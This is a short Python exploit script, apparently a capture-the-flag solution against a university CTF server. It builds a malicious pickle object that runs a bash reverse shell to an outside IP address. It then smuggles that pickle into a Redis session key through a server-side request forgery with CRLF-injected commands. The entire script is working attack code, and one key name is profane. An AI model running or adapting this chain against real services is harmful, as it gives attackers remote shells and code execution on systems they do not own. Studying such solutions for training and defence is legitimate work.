# coding=utf-8
import requests
import os
import redis
import _pickle as pickle


class A(object):
    def __reduce__(self):
        a = "bash -c 'bash -i >& /dev/tcp/140.113.209.28/1234 0>&1'"
        return (os.system, (a, ))


a = A()
result = pickle.dumps(a)

url = 'http://redis:6379/?q=a HTTP\x2f1.1\x0d\x0aSET session:fuck ' + str(
    result)[1:] + '\x0d\x0aSAVE\x0d\x0aHeader2\x3a'
my_params = {'url': url}
b = requests.post('https://edu-ctf.csie.org:10163/', my_params, verify=False)
print(b.text)
